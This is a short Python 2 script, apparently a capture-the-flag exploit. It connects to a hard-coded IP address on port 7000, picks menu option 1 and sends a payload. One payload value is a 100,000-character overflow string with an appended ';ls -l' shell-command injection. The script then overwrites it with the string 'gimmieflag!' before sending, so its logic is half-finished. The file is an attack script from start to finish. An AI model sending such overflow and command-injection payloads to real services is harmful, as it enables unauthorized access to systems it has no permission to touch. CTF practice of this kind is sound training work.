#!/usr/bin/env python
import socket
from time import sleep

shellcode = ('A' * 100000) + ';ls -l'

shellcode = "gimmieflag!"
print shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('52.30.206.11', 7000))

buff = ''

chunk = s.recv(1024)

while '>' not in chunk:
    buff = buff + chunk.strip()
    chunk = s.recv(1024)
    print chunk

s.send('1')
buff = s.recv(1024)
print buff

s.send(shellcode)
sleep(3)
buff = s.recv(9048)
s.close()

print buff